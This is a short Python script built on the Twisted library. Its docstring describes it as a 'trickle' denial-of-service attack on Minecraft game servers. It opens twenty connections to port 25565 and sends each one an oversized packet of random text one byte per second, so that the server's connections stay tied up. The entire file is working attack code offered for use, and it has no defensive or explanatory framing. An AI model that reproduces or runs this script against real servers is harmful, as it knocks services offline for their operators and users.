#!/usr/bin/env python

import random
import string
import sys

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint
from twisted.internet.task import LoopingCall
from twisted.python import log

log.startLogging(sys.stdout)

class TrickleProtocol(Protocol):
    """
    Implementation of the "trickle" DoS attack on MC servers.
    """

    def __init__(self):
        """
        Prepare our payload.
        """

        self.payload = "\x02\xff\xff" + "".join(
            random.choice(string.printable) for i in range(65335))
        self.index = 0

    def connectionMade(self):
        """
        Send our payload at an excrutiatingly slow pace.
        """

        log.msg("Starting trickle")

        self.loop = LoopingCall(self.sendchar)
        self.loop.start(1)

    def sendchar(self):
        """
        Send a single character down the pipe.
        """

        self.transport.write(self.payload[self.index])
        self.index += 1
        if self.index >= len(self.payload):
            # Just stop and wait to get reaped.
            self.loop.stop()

    def connectionLost(self, reason):
        """
        Remove ourselves from the factory.
        """

        self.factory.connections.discard(self)

class TrickleFactory(Factory):
    """
    Factory for maintaining a certain number of open connections.
    """

    protocol = TrickleProtocol

    def __init__(self, count):
        self.max_connections = count

        self.connections = set()
        self.endpoint = TCP4ClientEndpoint(reactor, "localhost", 25565)
        for i in range(count):
            self.spawn_connection()

        LoopingCall(self.log_status).start(5)

    def spawn_connection(self):
        log.msg("Spawning new connection")

        def cb(protocol):
            self.connections.add(protocol)
        self.endpoint.connect(self).addCallback(cb)

    def log_status(self):
        log.msg("%d active connections" % len(self.connections))

factory = TrickleFactory(20)
reactor.run()
